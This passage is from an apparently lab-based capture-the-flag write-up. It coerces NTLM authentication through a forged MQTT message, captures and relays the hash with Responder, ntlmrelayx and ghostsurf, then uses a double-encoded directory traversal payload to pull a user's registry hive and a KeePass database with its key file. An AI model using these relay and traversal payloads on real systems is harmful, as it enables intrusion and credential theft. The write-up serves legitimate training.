I’m using `-r` this time to have the topic retain the message. I noticed above that a client was connecting and then disconnecting every two seconds, and I want the message to be shown.

I’ll have [Responder](https://github.com/lgandx/Responder) running, and it picks up an authentication attempt:

```console
oxdf@hacky$ sudo uv run Responder.py -I tun0
...[snip]...
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.169]
    Responder IPv6             [dead:beef:2::110f]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-31YYC4LQHGW]
    Responder Domain Name      [3O8E.LOCAL]
    Responder DCE-RPC Port     [46849]

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.129.83.229
[HTTP] NTLMv2 Username : ghostlink\svc_canary
[HTTP] NTLMv2 Hash     : svc_canary::ghostlink:1122334455667788:12448D2C91D51311B02F9E604D046B1A:0101000000000000AEB6E9596A3FDD016C85286A9737EE96000000000200080033004F003800450001001E00570049004E002D003300310059005900430034004C0051004800470057000400140033004F00380045002E004C004F00430041004C0003003400570049004E002D003300310059005900430034004C0051004800470057002E0033004F00380045002E004C004F00430041004C000500140033004F00380045002E004C004F00430041004C0008005000500000000000000000000000004000000F7706E5CB6A9EC187F86657CE332D7F40B354111EBD483C8B6D9D21D50325849EA6E0B56B1FC312F086641EDEA22BE27F255F4E3441AFE2B8AB0BC43190031D0A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310035002E00310037000000000000000000
```

The svc_canary account is trying to authenticate. I’ll try to crack the hash, but it doesn’t crack with `rockyou.txt`.

#### Relay POC

I can’t recover the password, but I can relay the authentication to access the secure site. I’ll start `ntlmrelayx` with the following options:

- `-t http://gpz-op26-secure.ghostlink.htb` - The target of the relay attack
- `--http-port 8888` - Allows me to run without root privileges by starting the HTTP server on a high port
- `--keep-relaying` - Will continue to try the same user relay on multiple connections from the victim

Running this starts listening, and then I’ll coerce the authentication, making sure to update the URL to port 8888:

```console
oxdf@hacky$ mosquitto_pub -h ghostlink.htb -p 1883 -d -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' -m '{"timestamp":"2026-08-09-01:09:13","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.15.169:8888/healthcheck","lastCheckSecAgo":14,"responseCode":"200","ip":"172.16.20.10"}}'
Client null sending CONNECT
Client null received CONNACK (0)
Client null sending PUBLISH (d0, q0, r1, m1, 'GhostProtocolZero/systems/node/secureshare/healthcheck', ... (186 bytes))
Client null sending DISCONNECT
```

A few seconds later there’s a connection:

```console
oxdf@hacky$ ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 --keep-relaying
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
...[snip]...
[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.83.229 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.83.229 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
DEFAULT CASE
200 OK
b'<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="utf-8" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <meta name="description" content="Ghost Protocol Zero - Secure File Sharing" />\n    <base href="/" />\n    <link rel="stylesheet" href="lib/bootstrap/dist/css/bootstrap.min.css" />\n    <link rel="stylesheet" href="app.css" />\n    <link rel="icon" type="image/x-icon" href="favicon.png" />\n    <title>Ghost Protocol Zero | Secure Operations Channel</title>\n</head>\n\n<body>\n    <nav class="navbar">\n        <div class="nav-container">\n            <div class="nav-left">\n                <a href="/" class="nav-logo">\n                    <svg class="nav-logo-icon" width="33" height="33" viewBox="0 0 33 33" fill="none" xmlns="http://www.w3.org/2000/svg">\n                        <path d="M28 0H5C2.24 0 0 2.24 0 5v23c0 2.76 2.24 5 5 5h23c2.76 0 5-2.24 5-5V5c0-2.76-2.24-5-5-5ZM29 17c-6.63 0-12 5.37-12 12h-1c0-6.63-5.37-12-12-12v-1c6.63 0 12-5.37 12-12h1c0 6.63 5.37 12 12 12v1Z" fill="currentColor"/>\n                    </svg>\n                    <span class="nav-logo-text">Ghost Protocol Zero</span>\n                </a>\n            </div>\n            <div class="nav-right">\n                <a href="operation-briefing.pdf" download class="btn btn-primary">Latest Operation Briefing</a>\n            </div>\n        </div>\n    </nav>\n\n    <section class="hero-section">\n        <div class="container">\n            <div class="hero-grid">\n                <div class="hero-content">\n                    <h1 class="hero-heading">Influence comes from control.</h1>\n                    <p class="hero-subheading">Ghost Protocol Zero communications through classified channels. Task Force Nightfall is frequently deploying mass surveillance, our operational security is now of utmost importance. All uploads will be stored for 24hrs and encrypted at rest using the team leader\'s public key.</p>\n                    <button class="btn btn-primary btn-upload" id="toggleUploadBtn">\n                        Upload\n                    </button>\n                    \n                    <div id="uploadMessage" class="upload-message" style="display: none;"></div>\n                    \n                    <div id="shareLinkContainer" class="share-link-container" style="display: none;">\n                        <p class="share-label">Classified channel:</p>\n                        <div class="share-link-box">\n                            <input type="text" readonly id="shareLinkInput" class="share-link-input" />\n                            <button class="btn btn-copy" id="copyLinkBtn">Copy</button>\n                        </div>\n                    </div>\n                </div>\n                <div class="hero-image-wrapper">\n                    <div class="upload-zone-overlay" id="uploadZoneOverlay" style="display: none;">\n                        <div class="upload-zone">\n                            <div class="upload-zone-content">\n                                <svg class="upload-icon" width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">\n                                    <path d="M12 16V4M12 4L8 8M12 4L16 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\n                                    <path d="M4 14V18C4 19.1046 4.89543 20 6 20H18C19.1046 20 20 19.1046 20 18V14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\n                                </svg>\n                                <p class="upload-text">Drop classified intelligence here</p>\n                                <p class="upload-hint">Max file size: 5MB // No traceback</p>\n                                <input type="file" id="fileInput" multiple style="display: none;" />\n                                <label for="fileInput" class="btn btn-upload-browse">Browse Assets</label>\n                            </div>\n                        </div>\n                        \n                        <div id="selectedFilesList" class="selected-files-list" style="display: none;"></div>\n                    </div>\n                    <img src="images/hero-image.avif" \n                         alt="Team brainstorming in an office" \n                         class="hero-image" \n                         loading="lazy" />\n                    <div class="hero-overlay"></div>\n                </div>\n            </div>\n        </div>\n    </section>\n\n    <section class="features-section">\n        <div class="container">\n            <div class="features-header">\n                <h2 class="features-heading">Operational Security</h2>\n                <p class="features-subheading">Our objective is long-term access and credibility, our communications must remain invisible.</p>\n            </div>\n            <div class="features-grid">\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">Zero traceback</span>\n                            <h3 class="feature-title">No accounts. No logs. No identity.</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-1.avif" \n                             alt="Software security protocols" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">End-to-end encrypted</span>\n                            <h3 class="feature-title">Classified channels only</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-2.avif" \n                             alt="Cloud-based solutions interface" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">One-time links</span>\n                            <h3 class="feature-title">Ephemeral access. No persistent exposure.</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-3.avif" \n                             alt="Satellite communication service" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n            </div>\n        </div>\n    </section>\n\n    <script src="app.js"></script>\n</body>\n\n</html>\n'
```

It uses the relayed auth to get access to the page and returns a code of 200 and dumps that page. That’s success!

#### SOCKS Proxy

I’ll restart `ntlmrelayx` with the `-socks` option. This drops me to an interactive prompt:

```console
oxdf@hacky$ ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 --keep-relaying -socks
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

...[snip]...
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
...[snip]...
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>
```

`socks` will list the available proxies:

```console
ntlmrelayx> socks
[*] No Relays Available!
```

When the box next connects back, there’s a notification, and then there’s a new proxy in the list:

```console
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.83.229 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.83.229 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
[*] SOCKS: Adding HTTP://GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) [1] to active SOCKS connection. Enjoy
ntlmrelayx> socks
Protocol  Target                         Username              AdminStatus  Port  ID
--------  -----------------------------  --------------------  -----------  ----  ---
HTTP      gpz-op26-secure.ghostlink.htb  GHOSTLINK/SVC_CANARY  N/A          80    1
```

I’ll configure Burp so that it uses this SOCKS proxy:

![image-20260908065238009](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260908065238009.png)

Now when I load the page, and it asks for auth, I’ll give it the GHOSTLINK/SVC_CANARY as the user, and anything as the password. It shows in `ntlmrelayx`:

```console
[*] HTTP: Proxying client session for GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80)
[*] HTTP: Proxying client session for GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80)
```

And a page kind of loads:

![image-20260908065658194](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260908065658194.png)

I’m not getting the image (rather the alt text). That’s because `ntlmrelayx` only handles one request at a time, and Firefox is sending out several (for images, CSS, Javascript, etc). Only one is handled, and the rest fail.

#### ghostsurf

[ghostsurf](https://github.com/senderend/ghostsurf) is a tool from SpecterOps used for this kind of relay hijack, describing itself as:

> NTLM HTTP relay tool with SOCKS proxy for browser session hijacking. Capture NTLM auth, relay to HTTP/HTTPS targets, then browse as the victim through a SOCKS proxy. This works even when cookie replay doesn’t. Blog: [ghostsurf: From NTLM Relay to Browser Session Hijacking](https://specterops.io/blog/2026/04/02/ghostsurf-from-ntlm-relay-to-browser-session-hijacking/)

Their blog post goes into detail. It’s built on top of Impacket and similar to `ntlmrelayx`, but more focused and a better user experience.

I’ll clone it:

```console
oxdf@hacky$ git clone https://github.com/senderend/ghostsurf.git
Cloning into 'ghostsurf'...
remote: Enumerating objects: 354, done.
remote: Counting objects: 100% (10/10), done.
remote: Total 354 (delta 9), reused 9 (delta 9), pack-reused 344 (from 1)                                                              Receiving objects: 100% (354/354), 103.52 KiB | 2.25 MiB/s, done.
Resolving deltas: 100% (166/166), done.
```

And run it using `uv` with similar arguments as before, adding `--kernel-auth`. This works around IIS kernel-mode authentication, which has been the default since IIS 7:

```console
oxdf@hacky$ uv run --with-requirements requirements.txt ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb --keep-relaying --kernel-auth --http-port 8888

  ,--,   .-. .-. .---.    .---.  _______  .---. .-. .-.,---.    ,---.
.' .'    | | | |/ .-. )  ( .-._)|__   __|( .-._)| | | || .-.\   | .-'
|  |  __ | `-' || | |(_)(_) \     )| |  (_) \   | | | || `-'/   | `-.
\  \ ( _)| .-. || | | | _  \ \   (_) |  _  \ \  | | | ||   (    | .-'
 \  `-) )| | |)|\ `-' /( `-'  )    | | ( `-'  ) | `-')|| |\ \   | |
 )\____/ /(  (_) )---'  `----'     `-'  `----'  `---(_)|_| \)\  )\|
(__)    (__)    (_)  NTLM relay browser session hijacking  (__)(__)

[*] Target: http://gpz-op26-secure.ghostlink.htb
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] SOCKS proxy: 127.0.0.1:1080
[*] Kernel-mode auth workaround ENABLED
[*] Keep-relaying mode ENABLED (will reload targets after success)
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 8888
 * Serving Flask app 'lib.relay.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ghostsurf> socks
[*] No Relays Available!
```

At the time of my solving, there’s an issue in `ghostsurf` that leads to this error when the box connects:

```console
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.83.229 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[-] (HTTP): Exception while Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb: "'NTLMRelayxConfig' object has no attribute 'remove_target'"
[-] (HTTP): Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb failed
```

There’s already a [PR](https://github.com/senderend/ghostsurf/pull/3) to fix this:

![image-20260908070958549](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260908070958549.png)

I can clone that branch, or really, just add that one line to `config.py` as it describes.

Now on running it again, I get a proxy when it connects:

```console
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.83.229 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.83.229 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
[*] SOCKS: Adding GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy

ghostsurf> socks
Protocol  Target                         Username              AdminStatus  Port
--------  -----------------------------  --------------------  -----------  ----
HTTP      gpz-op26-secure.ghostlink.htb  GHOSTLINK/SVC_CANARY  N/A          80
```

Now reloading loads the page instantly:

![image-20260908110548367](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260908110548367.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

### Recover Gogs Password

#### Site Enumeration

Clicking the “Upload” button turns the top of the page into an upload dialog:

![image-20260908110733750](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260908110733750.png)

I’ll give it a file:

![image-20260908111254751](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260908111254751.png)

And click the button. It sends a POST request to `/api/upload`. Originally this failed for me. Some troubleshooting with Claude helped me find a bug in Impacket’s SOCKS HTTP relay plugin. `HTTPSocksRelay.prepareRequest()` treats the raw `bytes` request as a `str`, so its end-of-headers check (`part == ''`) never fires and its body extraction (`split(EOL+EOL)[1]`) truncates at the first blank line.

The result is that any relayed request with a body (like this multipart POST) gets corrupted. The body is duplicated and truncated, the upstream server resets the connection, and the dead session wedges the proxy for all later requests. GETs work fine because they have no body, which is why it hid so well.

The fix is three `bytes`/`str` corrections in [`impacket/examples/ntlmrelayx/servers/socksplugins/http.py`](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/servers/socksplugins/http.py), resulting in [this PR](https://github.com/fortra/impacket/pull/2287). Once I update to that version of the plugin, clicking results in a success message:

![image-20260908115449890](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260908115449890.png)

The download link gives what looks like purely encrypted data. It’s 768 bytes, which sounds like 3 blocks of 256 bytes, suggesting the data is encrypted in fixed-size blocks.

At the top right there’s a button that says “Latest Operation Briefing”. Clicking provides a PDF from `/operation-briefing.pdf`, but it has a really hard time getting the full thing:

![image-20260908112012690](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260908112012690.png)

I’ll never get a working PDF here, but I don’t need one.

#### Directory Traversal POC

The `/api/download/<file>` path seems like a good target for a directory traversal. I can try to read `C:\Windows\win.ini` using `..\`, but it returns 403:

![image-20260910103026260](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910103026260.png)

URL-encoding the `/` gives the same result:

![image-20260910103121829](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910103121829.png)

URL-encoding again works! The route value gets decoded twice before it reaches the file read, once by the framework and once by the application’s own code. I’ll show that in the decompiled source in Beyond Root.

![image-20260910103149210](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910103149210.png)

I can also use UNC paths to search from the root of a drive. For example, I can access `win.ini` from `\\127.0.0.1\C$\Windows\win.ini`:

![image-20260910130128067](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910130128067.png)

#### Web File Read

Windows is always trickier to figure out what to target with a directory traversal / file read. There aren’t many generic world readable files that are worth reading. There are two things that come to mind to enumerate further. The first is the web application, and the other is the user of the web application.

Starting with the web application, I can check for an `appsettings.json` [file](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/configuration/). Just going for the file fails, but going up one directory works:

![image-20260910130431160](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910130431160.png)

The resulting JSON is:

```json
{
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning"
    }
  },
  "AllowedHosts": "*"
}
```

There is no `web.config` file that I can find.

If I guess a lot, I can get the .NET binary for the webserver at `..\GhostProtocolZero.dll` (switching to the command line with `proxychains` here rather than Burp):

```console
oxdf@hacky$ proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255cGhostProtocolZero.dll' -O GhostProtocolZero.dll
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-09-10 17:16:35--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255cGhostProtocolZero.dll
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 14336 (14K) [application/octet-stream]
Saving to: ‘GhostProtocolZero.dll’

GhostProtocolZero.dll         100%[===============================================>]  14.00K  --.-KB/s    in 0.04s

2026-09-10 17:16:35 (348 KB/s) - ‘GhostProtocolZero.dll’ saved [14336/14336]

oxdf@hacky$ file GhostProtocolZero.dll
GhostProtocolZero.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

This isn’t part of the path to solving the box, but I’ll reverse engineer the DLL, see the directory traversal vulnerability, and play with decrypting files in Beyond Root.

#### User File Read

I do have the username that the service is running as, svc_canary, which means I can try to access their home directory. One level up from the uploads folder reached the application root where `appsettings.json` sits, and four gets to the root of the drive, where `Users` is. A quick check would be to look for `desktop.ini` files, which commonly show up in folders like `Documents`:

```console
oxdf@hacky$ proxychains curl 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cDocuments%255cdesktop.ini' -o-
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK

[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21770
IconResource=%SystemRoot%\system32\imageres.dll,-112
IconFile=%SystemRoot%\system32\shell32.dll
IconIndex=-235
```

That worked! I can also check the [PowerShell history file](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html):

```console
oxdf@hacky$ proxychains curl 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cAppData%255cRoaming%255cMicrosoft%255cWindows%255cPowerShell%255cPSReadLine%255cConsoleHost_history.txt'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
cmd
exit
cmd
exit
```

Nothing interesting there, but it does show that I can read from the user home directory.

I’ll grab the user registry hive, `ntuser.dat`:

```console
oxdf@hacky$ proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat' -O ntuser.dat
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-09-10 17:31:49--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 262144 (256K) [application/octet-stream]
Saving to: ‘ntuser.dat’

ntuser.dat                    100%[===============================================>] 256.00K   234KB/s    in 1.1s

2026-09-10 17:31:50 (234 KB/s) - ‘ntuser.dat’ saved [262144/262144]
```

#### User Registry Hive

There are several different tools to look at the data in this registry hive. On a Windows VM, I can use [Registry Explorer](https://ericzimmerman.github.io/#!index.md), which provides a GUI, which can be nice for exploring the hive. A nice find is the recent documents reg key:

![image-20260910151632805](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910151632805.png)

The `MRUListEx` key has a list of IDs. In this case, it only has 0, which points to the 0 key which has the unicode for `db.zip`.

On Linux, `regripper` (`apt install regripper`) will dump all the info (with `-a`), or targeted info (with `-p`):

```console
oxdf@hacky$ regripper -r ntuser.dat -p recentdocs
Launching recentdocs v.20200427
recentdocs v.20200427
(NTUSER.DAT) Gets contents of user's RecentDocs key

RecentDocs
**All values printed in MRUList\MRUListEx order.
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
LastWrite Time: 2026-05-13 01:56:02Z

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
LastWrite Time 2026-05-13 01:56:02Z
MRUListEx = 0
  0 = db.zip
```

The same result is present here.

Or I can just ask Claude:

```claude
 ▐▛███▛█   Claude Code v2.1.266
▝▜██████▀  Opus 5 · Claude Max
  ▝▝ ▝▝    ~/temp

Fable 5.1 writes better code and reports progress on long tasks. Switch anytime with /model.

❯ what can i learn from the ntuser.dat file in this directory

● I'll take a look at what's in the directory first.

Searched for 1 pattern, listed 1 directory, ran 14 shell commands (ctrl+o to expand)

● It's a small, freshly-created profile hive — 462 keys, clean (seq 0x22 == 0x22), original path \c:\users\svc_canary\ntuser.dat. Here's what it gives up:

Identity / host - User: svc_canary (Explorer\Shell Folders → C:\Users\svc_canary\...) - Domain: ghostlink.htb, DC = \\dc01.ghostlink.htb (Group Policy\History\DCName) - Domain SID: S-1-5-21-3426459382-1936297842-2312468024 - OS build 26100 = Win11 24H2 / Server 2025, en-US, timezone UTC‑7 (derived: local 2026/05/12 18:56:33 vs UTC key write 01:56:33Z)

The most useful finding — group membership (Group Policy\GroupMembership, 12 SIDs): - S-1-5-32-568 = BUILTIN\IIS_IUSRS - S-1-5-32-574 = BUILTIN\Certificate Service DCOM Access - plus Domain Users / Users, integrity level High — not a local admin

So svc_canary is a web-service identity with AD CS enrollment access. That's the escalation shape to chase (web app → svc_canary → ESC‑style cert abuse against dc01), not local privesc.

Password policy: Winlogon\PasswordExpiryNotification\NotShownReason = PasswordNeverExpires — the credential, once found, stays good.

User activity — exactly one artifact:
  Explorer\RecentDocs\.zip\0 = 64 00 62 00 2e 00 7a 00 69 00 70 00 00 00  -> "db.zip" No RunMRU, TypedPaths, UserAssist, ComDlg32, MountPoints2, TypedURLs, or Run/RunOnce. And that RecentDocs value is the bare filename with no trailing shell-link blob, which is what a hand-planted entry looks like — db.zip reads as a deliberate breadcrumb.

Timeline: 455 of 462 keys written at 2026-05-13 01:56:02Z (first logon, profile built from Default), last write 02:01:32Z → a ~5-minute session. Older stragglers (2024-04-01, 2026-02-24/25 Census + a stock login.live.com device cookie) are inherited image artifacts, not user activity.

Dead ends I ruled out: no credentials in any string (UTF‑16 or ASCII), no persistence, no PuTTY/WinSCP/RDP/VNC/SSH keys, the 122,880 bytes past the hive bins are all zero, and carving the 11,872 bytes of free cells recovered only cert-store scaffolding and a 4 KB Dummy value.

✻ Cooked for 3m 1s · done 7:03 PM

※ recap: Goal was to see what the ntuser.dat in /home/oxdf/temp reveals; analysis is done and written to claude_notes.md. Key leads: user svc_canary on ghostlink.htb, IIS plus AD CS access, and one opened file db.zip. Next: go find db.zip. (disable recaps in /config)
```

#### Acquire KeePass Database

`db.zip` sounds interesting. Windows saves a link to recent documents location in `AppData\Roaming\Microsoft\Windows\Recent` under the same filename plus `.lnk`. I’ll get that using the directory traversal:

```console
oxdf@hacky$ proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cAppData%255cRoaming%255cMicrosoft%255cWindows%255cRecent%255cdb.zip.lnk' -O db.zip.lnk
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-09-10 19:21:25--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cAppData%255cRoaming%255cMicrosoft%255cWindows%255cRecent%255cdb.zip.lnk
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 792 [application/octet-stream]
Saving to: ‘db.zip.lnk’

db.zip.lnk                    100%[===============================================>]     792  --.-KB/s    in 0s

2026-09-10 19:21:25 (68.7 MB/s) - ‘db.zip.lnk’ saved [792/792]
```

This downloads the actual link file:

```console
oxdf@hacky$ file db.zip.lnk
db.zip.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Unicoded, MachineID gpz-op26-secure, Archive, ctime=Wed Feb 25 13:52:39 2026, atime=Wed Feb 25 14:04:19 2026, mtime=Wed Feb 25 14:04:19 2026, length=0, window=normal, IDListSize 0x014c, Root folder "D3162B92-9365-467A-956B-92703ACA08AF", LocalBasePath "C:\Users\svc_canary\Documents\Operations\Management\db.zip"
```

But that has the full path of the actual file, which I’ll get:

```console
oxdf@hacky$ proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cDocuments%255cOperations%255cManagement%255cdb.zip' -O db.zip
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-09-10 19:22:38--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cDocuments%255cOperations%255cManagement%255cdb.zip
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 165761 (162K) [application/octet-stream]
Saving to: ‘db.zip’

db.zip                        100%[===============================================>] 161.88K  --.-KB/s    in 0.04s

2026-09-10 19:22:38 (3.88 MB/s) - ‘db.zip’ saved [165761/165761]

oxdf@hacky$ file db.zip
db.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

I’ll decompress it, showing a [KeePass](https://keepass.info/) database:

```console
oxdf@hacky$ unzip db.zip
Archive:  db.zip
  inflating: db.kdbx
  inflating: .key.keyx
```

#### KeePass Data

The zip archive has a KeePass database and a key file, which has a standard XML format:

```xml
<?xml version="1.0" encoding="utf-8"?>
<KeyFile>
        <Meta>
                <Version>2.0</Version>
        </Meta>
        <Key>
                <Data Hash="F79BD113">
                        5D00B69B D10257D8 EE8FF876 A7C11FF3
                        C8BD0C0B BFA1E957 7071A43E B71CC751
                </Data>
        </Key>
</KeyFile>
```

Having them together in a zip makes it very easy to get access. I’ll pass both to KeePassXC:

![image-20260910165426889](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910165426889.png)

There are a few folders:

![image-20260910171203100](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260910171203100.png)

Most of the entries have a note that says “Migrated into centralized password manager”. For example:

